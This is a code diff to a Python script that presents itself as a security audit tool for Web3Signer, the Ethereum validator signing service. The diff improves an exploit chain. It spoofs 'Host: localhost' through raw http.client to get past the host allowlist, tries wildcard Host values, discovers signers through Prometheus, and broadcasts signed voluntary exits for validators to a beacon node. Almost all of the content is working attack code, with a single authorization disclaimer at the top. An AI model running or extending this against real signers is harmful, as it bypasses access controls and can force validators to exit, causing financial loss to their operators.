@@ -33,30 +33,46 @@ Usage:
 IMPORTANT: This is a security audit tool. Only use against systems you are authorized to test.
 """
 
+from __future__ import annotations
+
 import argparse
+import http.client
 import ipaddress
 import json
 import socket
 import sys
 import time
-import urllib.request
-import urllib.error
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, field
-from typing import Optional
+from typing import Dict, Optional, Tuple
 
 
 # ---------------------------------------------------------------------------
-# Core HTTP helper — every request spoofs Host: localhost (Gap 1 bypass)
+# Core HTTP helper — uses http.client directly (NOT urllib)
+# urllib routes through system proxy and can corrupt/strip the Host header.
+# http.client sends raw TCP with the exact headers we set.
 # ---------------------------------------------------------------------------
 
-def req(target: str, method: str, path: str, body: dict | str | None = None,
-        accept_json: bool = True) -> tuple[int, str]:
-    """Send an HTTP request with Host: localhost to bypass HostAllowListHandler."""
-    url = f"http://{target}{path}"
+def _parse_target(target):
+    # type: (str) -> Tuple[str, int]
+    if ":" in target:
+        parts = target.rsplit(":", 1)
+        return parts[0], int(parts[1])
+    return target, 9000
+
+
+def req(target, method, path, body=None, accept_json=True, timeout=10):
+    # type: (str, str, str, Optional[any], bool, int) -> Tuple[int, str]
+    """
+    Send HTTP request via http.client.HTTPConnection directly.
+    Spoofs Host: localhost to bypass HostAllowListHandler (Gap 1).
+    No proxy, no redirect following, no header rewriting.
+    """
+    host, port = _parse_target(target)
+
     data = None
     if body is not None:
-        data = (json.dumps(body) if isinstance(body, dict) else body).encode("utf-8")
+        data = json.dumps(body) if isinstance(body, dict) else str(body)
 
     headers = {
         "Host": "localhost",                          # Gap 1: bypass HostAllowListHandler
@@ -65,23 +81,33 @@ def req(target: str, method: str, path: str, body: dict | str | None = None,
     if accept_json:
         headers["Accept"] = "application/json"
 
-    request = urllib.request.Request(url, data=data, headers=headers, method=method)
+    conn = None
     try:
-        with urllib.request.urlopen(request, timeout=10) as resp:
-            return resp.status, resp.read().decode("utf-8")
-    except urllib.error.HTTPError as e:
-        return e.code, e.read().decode("utf-8") if e.fp else ""
+        conn = http.client.HTTPConnection(host, port, timeout=timeout)
+        conn.request(method, path, body=data, headers=headers)
+        resp = conn.getresponse()
+        return resp.status, resp.read().decode("utf-8", errors="replace")
+    except socket.timeout:
+        return 0, "CONNECTION TIMEOUT after %ds to %s:%d" % (timeout, host, port)
+    except ConnectionRefusedError:
+        return 0, "CONNECTION REFUSED — %s:%d is not listening" % (host, port)
+    except OSError as e:
+        return 0, "NETWORK ERROR to %s:%d — %s" % (host, port, e)
     except Exception as e:
-        return 0, str(e)
+        return 0, "ERROR: %s: %s" % (type(e).__name__, e)
+    finally:
+        if conn:
+            conn.close()
 
 
-def jsonrpc(target: str, method: str, params=None, rpc_id: int = 1) -> tuple[int, dict]:
+def jsonrpc(target, method, params=None, rpc_id=1):
+    # type: (str, str, Optional[list], int) -> Tuple[int, dict]
     """Send a JSON-RPC 2.0 call (Eth1 mode) through the root path."""
     body = {"jsonrpc": "2.0", "method": method, "params": params or [], "id": rpc_id}
     status, text = req(target, "POST", "/", body)
     try:
         return status, json.loads(text)
-    except json.JSONDecodeError:
+    except (json.JSONDecodeError, ValueError):
         return status, {"error": text}
 
 
@@ -177,11 +203,17 @@ def discover_via_prometheus(prometheus_url: str) -> list[str]:
     found = []
 
     try:
-        # Query Prometheus targets API
-        targets_url = f"{prometheus_url}/api/v1/targets"
-        request = urllib.request.Request(targets_url, headers={"Host": "localhost"})
-        with urllib.request.urlopen(request, timeout=5) as resp:
-            data = json.loads(resp.read().decode("utf-8"))
+        # Query Prometheus targets API via http.client
+        from urllib.parse import urlparse
+        parsed_prom = urlparse(prometheus_url)
+        prom_host = parsed_prom.hostname or "localhost"
+        prom_port = parsed_prom.port or 9090
+
+        prom_conn = http.client.HTTPConnection(prom_host, prom_port, timeout=5)
+        prom_conn.request("GET", "/api/v1/targets", headers={"Host": prom_host})
+        prom_resp = prom_conn.getresponse()
+        data = json.loads(prom_resp.read().decode("utf-8"))
+        prom_conn.close()
 
         active_targets = data.get("data", {}).get("activeTargets", [])
         for target in active_targets:
@@ -194,7 +226,6 @@ def discover_via_prometheus(prometheus_url: str) -> list[str]:
                 print(f"  [+] Prometheus target: job={job} address={address}")
                 # Extract hostname, replace metrics port (9001) with signing port (9000)
                 try:
-                    from urllib.parse import urlparse
                     parsed = urlparse(address)
                     host = parsed.hostname
                     signer_target = f"{host}:9000"
@@ -208,10 +239,12 @@ def discover_via_prometheus(prometheus_url: str) -> list[str]:
 
         # Also search for web3signer in metric names
         if not found:
-            series_url = f"{prometheus_url}/api/v1/label/__name__/values"
-            request = urllib.request.Request(series_url, headers={"Host": "localhost"})
-            with urllib.request.urlopen(request, timeout=5) as resp:
-                metrics = json.loads(resp.read().decode("utf-8"))
+            prom_conn2 = http.client.HTTPConnection(prom_host, prom_port, timeout=5)
+            prom_conn2.request("GET", "/api/v1/label/__name__/values",
+                               headers={"Host": prom_host})
+            prom_resp2 = prom_conn2.getresponse()
+            metrics = json.loads(prom_resp2.read().decode("utf-8"))
+            prom_conn2.close()
             signer_metrics = [m for m in metrics.get("data", [])
                             if "signing" in m.lower() or "web3signer" in m.lower()]
             if signer_metrics:
@@ -581,14 +614,17 @@ def step0_verify_bypass(target: str) -> bool:
         return True
 
     # Path 2: Try wildcard host (operator may have set --http-host-allowlist=*)
-    for host_val in ["*", target.split(":")[0], "web3signer", ""]:
+    host_part, port_part = _parse_target(target)
+    for host_val in ["*", host_part, "web3signer", ""]:
         try:
-            url = f"http://{target}/upcheck"
-            r = urllib.request.Request(url, headers={"Host": host_val}, method="GET")
-            with urllib.request.urlopen(r, timeout=3) as resp:
-                if resp.status == 200:
-                    print(f"  [+] BYPASS B: Host={host_val!r} accepted (wildcard allowlist)")
-                    return True
+            conn = http.client.HTTPConnection(host_part, port_part, timeout=3)
+            conn.request("GET", "/upcheck", headers={"Host": host_val})
+            resp = conn.getresponse()
+            if resp.status == 200:
+                print(f"  [+] BYPASS B: Host={host_val!r} accepted (wildcard allowlist)")
+                conn.close()
+                return True
+            conn.close()
         except Exception:
             continue
 
@@ -860,20 +896,26 @@ def step4_broadcast_exits(results: Results, beacon_node: str):
                 "validator_index": exit_data.validator_index
             },
             "signature": exit_data.signature
-        }).encode("utf-8")
+        })
 
-        url = f"{beacon_node}/eth/v1/beacon/pool/voluntary_exits"
-        request = urllib.request.Request(url, data=body, method="POST",
-                                          headers={"Content-Type": "application/json"})
+        from urllib.parse import urlparse
+        parsed_bn = urlparse(beacon_node)
+        bn_host = parsed_bn.hostname or "localhost"
+        bn_port = parsed_bn.port or 5052
+        bn_path = "/eth/v1/beacon/pool/voluntary_exits"
+
         try:
-            with urllib.request.urlopen(request, timeout=10) as resp:
-                print(f"  [+] EXIT BROADCAST for validator {exit_data.validator_index}: "
-                      f"status={resp.status}")
-        except urllib.error.HTTPError as e:
-            print(f"  [-] Broadcast failed for validator {exit_data.validator_index}: "
-                  f"status={e.code} {e.read().decode()[:80]}")
+            bn_conn = http.client.HTTPConnection(bn_host, bn_port, timeout=10)
+            bn_conn.request("POST", bn_path, body=body,
+                           headers={"Content-Type": "application/json",
+                                    "Host": bn_host})
+            bn_resp = bn_conn.getresponse()
+            resp_body = bn_resp.read().decode("utf-8", errors="replace")
+            print(f"  [+] EXIT BROADCAST for validator {exit_data.validator_index}: "
+                  f"status={bn_resp.status}")
+            bn_conn.close()
         except Exception as e:
-            print(f"  [-] Broadcast failed: {e}")
+            print(f"  [-] Broadcast failed for validator {exit_data.validator_index}: {e}")
 
 
 # ---------------------------------------------------------------------------
